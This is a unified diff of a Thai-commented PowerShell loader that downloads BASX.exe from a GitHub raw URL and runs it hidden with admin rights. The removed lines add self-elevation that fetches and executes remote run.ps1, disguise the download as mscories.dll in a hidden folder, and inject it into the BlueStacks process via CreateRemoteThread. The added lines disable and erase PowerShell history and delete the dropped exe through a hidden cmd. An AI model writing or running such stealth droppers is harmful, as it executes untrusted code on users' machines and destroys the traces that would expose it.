@@ -1,73 +1,45 @@
-# 1. ขอสิทธิ์ Administrator
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/silentaimv1-png/basxpanel/refs/heads/main/run.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
-    exit
-}
+# 1. จัดการเรื่องประวัติ (เน้นความเงียบ)
+try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
+$ErrorActionPreference = 'SilentlyContinue'
 
-# 2. ตั้งค่าไฟล์และการพรางตัว
-$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
-$fakeName = "mscories.dll"
+# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
-$dllPath = Join-Path $workDir $fakeName
-$targetProcess = "HD-Player"
-
-# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์)
-if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-attrib +h +s $workDir
-
-# 4. ดาวน์โหลด DLL แบบเงียบ
-$ProgressPreference = 'SilentlyContinue'
-Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
-
-# 5. โค้ด C# สำหรับ Inject DLL (รันใน RAM)
-$Source = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-using System.Text;
-
-public class Injector {
-    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
-    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
-    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    public static void Inject(int pid, string dllPath) {
-        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
-        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
-        IntPtr outSize;
-        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
-        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
-    }
+if (-not (Test-Path $workDir)) { 
+    New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
 }
-"@
+$output = Join-Path $workDir "WinHelper.exe"
+$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
 
-# 6. เริ่มการ Inject เข้า BlueStacks
-if (Test-Path $dllPath) {
-    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-    if (!$proc) {
-        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
-        Start-Sleep -Seconds 6
-        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-    }
-
-    if ($proc) {
-        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
-        [Injector]::Inject($proc.Id, $dllPath)
-    }
+# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดใหม่
+if (Test-Path $output) { Remove-Item $output -Force }
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($url, $output)
+} catch {
+    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
 }
 
-# 7. ลบร่องรอย (ไม่รีสตาร์ท Explorer)
-Start-Sleep -Seconds 5
-Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-Clear-History -ErrorAction SilentlyContinue
-
-# ล้าง Registry MuiCache
-$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
-    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+# 4. ตรวจสอบไฟล์แล้วสั่งรันระบบแบบสิทธิ์ Admin
+if (Test-Path $output) {
+    try {
+        $sh = New-Object -ComObject Shell.Application
+        $sh.ShellExecute($output, "", "", "runas", 1)
+        Start-Sleep -Seconds 3
+    } catch {
+        Start-Process -FilePath $output -Verb RunAs
+    }
 }
+
+# 5. เปิดระบบบันทึกประวัติกลับมา และสั่ง CMD เก็บกวาดเบื้องหลัง (รอ 15 วินาทีแล้วลบไฟล์ EXE)
+try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
+try {
+    $cleanCmd = "timeout /t 15 && del /f /q `"$output`""
+    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
+} catch {}
+
+# 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
+try {
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+} catch {}
+
+exit
